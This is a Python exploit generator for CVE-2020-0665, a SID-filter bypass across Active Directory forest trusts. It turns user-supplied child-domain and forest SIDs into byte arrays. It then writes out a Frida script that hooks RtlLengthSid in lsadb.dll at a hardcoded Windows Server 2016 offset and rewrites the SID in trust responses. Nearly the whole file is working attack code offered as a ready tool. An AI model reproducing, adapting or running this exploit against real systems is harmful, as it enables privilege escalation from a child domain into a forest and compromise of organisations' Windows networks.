#!/usr/bin/env python3
import argparse
import sys
import time
import threading
import os

def convert_sid_to_hex(sid, debug=False):
    # Split SID into components and validate basic structure
    sid_parts = sid.split('-')
    if len(sid_parts) < 4 or not sid.startswith('S-'):
        raise ValueError(f"Invalid SID format: {sid}")
    
    # Extract dynamic prefix (first 4 components: S-R-I-S)
    prefix_parts = sid_parts[:4]
    dynamic_prefix = '-'.join(prefix_parts) + '-'
    
    # Get components after dynamic prefix
    remaining = sid[len(dynamic_prefix):].split('-')
    
    if not remaining:
        raise ValueError(f"SID contains no components after prefix: {sid}")
    
    output = []
    for component in remaining:
        try:
            # Convert component to 4-byte little-endian format
            decimal = int(component)
            hex_str = f"{decimal:08x}"
            little_endian = [hex_str[i:i+2] for i in range(6, -2, -2)]
            formatted = ", ".join([f"0x{byte.upper()}" for byte in little_endian])
            output.append(formatted)
        except ValueError:
            raise ValueError(f"Invalid numeric component in SID: {component}")

    if debug:
        print(f"Converted SID {sid} to bytes: {', '.join(output)}")
    
    return ", ".join(output)

def generate_frida_script(child_sid, forest_sid, debug=False):
    template = """from __future__ import print_function
import frida
import sys

def on_message(message, data):
    print("[%s] => %s" % (message, data))

def main(target_process):
    session = frida.attach(target_process)

    script = session.create_script(\"""
// Find base address of current imported lsadb.dll by lsass
var baseAddr = Module.findBaseAddress('lsadb.dll');
console.log('lsadb.dll baseAddr: ' + baseAddr);
// Add call to RtlLengthSid from LsaDbpDsForestBuildTrustEntryForAttrBlock
// (address valid for Server 2016 v1607)
var returnaddr = ptr('0x151dc');
var resolvedreturnaddr = baseAddr.add(returnaddr)
// Sid as binary array to find/replace
var buf1 = [CHILD_SID_PLACEHOLDER];
var newsid = [FOREST_SID_PLACEHOLDER];
// Find module and attach
var f = Module.getExportByName('ntdll.dll', 'RtlLengthSid');
Interceptor.attach(f, {
  onEnter: function (args) {
    // Only do something calls that have the return address we want
    if(this.returnAddress.equals(resolvedreturnaddr)){
        console.log("entering intercepted function will return to r2 " + this.returnAddress);
        // Dump current SID
        console.log(hexdump(args[0], {
          offset: 0,
          length: 24,
          header: true,
          ansi: false
        }));
        // If this is the sid to replace, do so
        if(equal(buf1, args[0].readByteArray(24))){
            console.log("sid matches!");
            args[0].writeByteArray(newsid);
            console.log("modified SID in response");
        }
    }
  },
});
function equal (buf1, buf2)
{
    var dv1 = buf1;
    var dv2 = new Uint8Array(buf2);
    for (var i = 0 ; i != buf2.byteLength ; i++)
    {
        if (dv1[i] != dv2[i]){
            return false;
        }
    }
    return true;
}

\""")
    script.on('message', on_message)
    script.load()
    print("[!] Ctrl+D on UNIX, Ctrl+Z on Windows/cmd.exe to detach from instrumented program.\\n\\n")
    sys.stdin.read()
    session.detach()

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: %s <process name or PID>" % __file__)
        sys.exit(1)

    try:
        target_process = int(sys.argv[1])
    except ValueError:
        target_process = sys.argv[1]
    main(target_process)
"""

    child_bytes = convert_sid_to_hex(child_sid, debug)
    forest_bytes = convert_sid_to_hex(forest_sid, debug)
    
    return template.replace(
        "CHILD_SID_PLACEHOLDER", 
        f"0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, {child_bytes}"
    ).replace(
        "FOREST_SID_PLACEHOLDER", 
        f"0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, {forest_bytes}"
    )

class Spinner:
    def __init__(self):
        self.spinner_chars = '|/-\\'
        self.stop = False
        
    def spin(self):
        i = 0
        while not self.stop:
            sys.stdout.write(f'\r{self.spinner_chars[i]} Working...  ')
            sys.stdout.flush()
            time.sleep(0.1)
            i = (i + 1) % 4
        sys.stdout.write('\rDone!          \n')

def main():
    start_time = time.time()
    parser = argparse.ArgumentParser(
        description='SID Filter Bypass Tool (CVE-2020-0665) - Generate Frida Interception Script',
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('-c', '--child-sid', 
                      required=True, 
                      help='Child Domain SID (e.g., S-1-3-21-2327345182-1863223493-3435513819)')
    parser.add_argument('-f', '--forest-sid', 
                      required=True, 
                      help='Forest Server Local SID (e.g., S-1-5-21-1234567890-0987654321-1122334455)')
    parser.add_argument('-d', '--debug', 
                      action='store_true', 
                      help='Enable debug output')
    parser.add_argument('-o', '--output', 
                      default='frida_intercept.py', 
                      help='Output file name (default: frida_intercept.py)')

    args = parser.parse_args()

    if not args.child_sid or not args.forest_sid:
        parser.print_help()
        sys.exit(1)

    spinner = None
    if not args.debug:
        spinner = Spinner()
        spinner_thread = threading.Thread(target=spinner.spin)
        spinner_thread.start()

    try:
        script_content = generate_frida_script(args.child_sid, args.forest_sid, args.debug)
        
        with open(args.output, 'w') as f:
            f.write(script_content)
            
        if args.debug:
            print(f"\nScript generated successfully at {args.output}")
            
    except Exception as e:
        if spinner:
            spinner.stop = True
            spinner_thread.join()
        print(f"\nError: {str(e)}", file=sys.stderr)
        sys.exit(1)

    if spinner:
        spinner.stop = True
        spinner_thread.join()

    elapsed_time = time.time() - start_time
    print(f"\nSuccess! Script generated in {elapsed_time:.2f} seconds")
    print(f"Output file: {os.path.abspath(args.output)}")

if __name__ == '__main__':
    main()
